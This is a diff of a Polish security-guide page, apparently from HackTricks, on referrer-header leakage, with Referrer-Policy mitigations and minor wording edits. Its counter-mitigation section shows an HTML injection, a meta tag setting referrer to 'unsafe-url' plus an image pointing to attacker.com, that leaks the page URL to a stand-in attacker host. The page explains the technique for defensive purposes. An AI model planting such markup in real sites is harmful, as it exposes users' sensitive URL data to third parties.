@@ -10,7 +10,7 @@ Jeśli w pewnym momencie na stronie internetowej jakiekolwiek wrażliwe informac
 
 ## Łagodzenie
 
-Możesz sprawić, że przeglądarka będzie przestrzegać **Referrer-policy**, która mogłaby **zapobiec** wysyłaniu wrażliwych informacji do innych aplikacji internetowych:
+Możesz sprawić, że przeglądarka będzie przestrzegać **polityki referrer**, która mogłaby **zapobiec** wysyłaniu wrażliwych informacji do innych aplikacji internetowych:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -24,12 +24,12 @@ Referrer-Policy: unsafe-url
 ## Counter-Mitigation
 
 Możesz nadpisać tę regułę, używając tagu meta HTML (atakujący musi wykorzystać i wstrzyknięcie HTML):
-```markup
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
 ## Obrona
 
-Nigdy nie umieszczaj żadnych wrażliwych danych w parametrach GET ani w ścieżkach w URL-u.
+Nigdy nie umieszczaj żadnych wrażliwych danych w parametrach GET ani w ścieżkach w URL.
 
 {{#include ./banners/hacktricks-training.md}}
